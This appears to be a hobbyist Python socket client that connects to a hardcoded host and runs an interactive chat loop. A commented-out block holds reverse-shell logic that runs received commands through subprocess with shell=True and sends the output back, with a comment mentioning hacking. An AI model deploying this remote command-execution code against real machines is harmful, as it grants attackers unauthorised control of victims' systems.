import socket
import sys
import os
import subprocess

s= socket.socket()
host = "10.0.0.163"
port = 9998

try:
    s.connect((host,port)) #similar to binding
except Exception as msg:
    print ("Problem connecting to given host. Error: "+str(msg))
    sys.exit()

client_response = str(s.recv(1024),"utf-8")
new_port = int(client_response)
s.close()
s=socket.socket()

try:
    s.connect((host,new_port)) #similar to binding
except Exception as msg:
    print ("Problem connecting to given host at new port. Error: "+str(msg))
    sys.exit()

while True:

    # try:
    #     data=s.recv(1024)
    # except Exception as msg:
    #     print ("connection closed by remote server!")
    #     print ("received error: "+str(msg))
    #     sys.exit()   

    # data=s.recv(1024)
    # if data[:2].decode("utf-8") == "cd":
    #     os.chdir(data[2:].decode("utf-8"))
    
    # if len(data)>0:
    #     cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    #     output_byte = cmd.stdout.read()+cmd.stderr.read()
    #     output_str = str(output_byte,"utf-8")
    #     currentWD = os.getcwd() + "> "

    #     s.send(str.encode(output_str + currentWD))

    #     #optional. Not needed when hacking
    #     print (output_str)

    # # except Exception as msg:
    # #     print ("connection closed by remote server!")
    # #     print ("received error: "+str(msg))
    # #     sys.exit()
    to_send = input("\nCHAT> ")
    if to_send == "quit":
        s.close()
        sys.exit()
    if len(str.encode(to_send))>0:
        s.send(str.encode(to_send))
        client_response = str(s.recv(1024),"utf-8")
        #print(client_response,end="")